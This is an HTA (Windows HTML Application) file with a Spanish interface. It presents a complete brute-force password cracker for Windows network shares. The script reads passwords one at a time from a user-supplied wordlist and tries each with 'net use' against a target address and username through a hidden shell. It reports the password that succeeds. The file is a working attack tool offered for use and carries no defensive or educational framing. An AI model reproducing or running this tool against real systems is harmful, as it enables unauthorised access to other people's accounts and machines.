<!DOCTYPE html>
<html>
<head>
    <title>Brute Force - Maykel Millan</title>
    <hta:application 
        id="bruteforce"
        applicationname="Brute Force"
        border="thin"
        borderstyle="normal"
        caption="yes"
        icon="shell32.dll,43"
        maximizebutton="no"
        minimizebutton="yes"
        sysmenu="yes"
        scroll="no"
        singleinstance="yes"
        showintaskbar="yes"
        windowstate="normal"
    />
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #FFFF66;
            color: black;
        }
        .container {
            width: 400px;
            margin: 0 auto;
            padding-top: 20px;
        }
        .title {
            text-align: center;
            font-size: 24px;
            font-weight: bold;
        }
        .subtitle {
            text-align: center;
            margin-bottom: 20px;
        }
        .button {
            width: 100%;
            padding: 10px;
            background-color: #FF9900;
            border: none;
            cursor: pointer;
            font-size: 16px;
            margin-bottom: 10px;
        }
        .button:hover {
            background-color: #FF6600;
        }
        input[type="text"], input[type="file"] {
            width: 100%;
            padding: 10px;
            margin-bottom: 10px;
            font-size: 16px;
            border: none;
        }
        .output {
            margin-top: 20px;
            background-color: #FF9900;
            padding: 10px;
            border-radius: 5px;
            display: none;
        }
        .output p {
            margin: 0;
        }
        #progressBar {
            width: 100%;
            background-color: #FF6600;
            height: 20px;
            display: none;
        }
        #progress {
            width: 0%;
            height: 100%;
            background-color: #FF9900;
            text-align: center;
            line-height: 20px;
            color: black;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="title">Bienvenido a Brute-Force</div>

        <label for="user">Username:</label>
        <input type="text" id="user" placeholder="Username">

        <label for="ip">Address:</label>
        <input type="text" id="ip" placeholder="Address">

        <label for="list">WordList:</label>
        <input type="file" id="list" accept=".txt">

        <button class="button" onclick="startBruteForce()">Iniciar Ataque</button>
        <button class="button" onclick="closeHTA()">Cerrar</button>

        <div id="progressBar">
            <div id="progress">0%</div>
        </div>

        <div id="output" class="output">
            <p id="status"></p>
        </div>
    </div>

    <script>
        function startBruteForce() {
            var user = document.getElementById("user").value;
            var ip = document.getElementById("ip").value;
            var list = document.getElementById("list").value;

            if (user === "" || ip === "" || list === "") {
                alert("Todos los campos son obligatorios.");
                return;
            }

            document.getElementById("progressBar").style.display = "block";
            document.getElementById("output").style.display = "block";
            document.getElementById("status").innerText = "Iniciando el ataque...";

            var fso = new ActiveXObject("Scripting.FileSystemObject");
            if (!fso.FileExists(list)) {
                alert("El archivo de la lista de contraseÃ±as no existe.");
                return;
            }

            var file = fso.OpenTextFile(list, 1);
            var pass;
            var count = 0;
            var found = false;

            var interval = setInterval(function() {
                if (!file.AtEndOfStream) {
                    pass = file.ReadLine();
                    count++;

                    var shell = new ActiveXObject("WScript.Shell");
                    var cmd = "cmd /c net use \\\\" + ip + " /user:" + user + " " + pass + " >nul 2>&1";
                    var errorCode = shell.Run(cmd, 0, true);

                    document.getElementById("status").innerText = "[INTENTO: " + count + "][" + pass + "]";
                    document.getElementById("progress").style.width = (count % 100) + "%";
                    document.getElementById("progress").innerText = (count % 100) + "%";

                    if (errorCode === 0) {
                        found = true;
                        document.getElementById("status").innerText = "Password Encontrada: " + pass;
                        document.getElementById("progressBar").style.display = "none";
                        clearInterval(interval);
                    }
                } else {
                    clearInterval(interval);
                    if (!found) {
                        document.getElementById("status").innerText = "Password no encontrada :(";
                        document.getElementById("progressBar").style.display = "none";
                    }
                    file.Close();
                }
            }, 100); // Velocidad de la barra de carga
        }

        function closeHTA() {
            window.close();
        }
    </script>
</body>
</html>
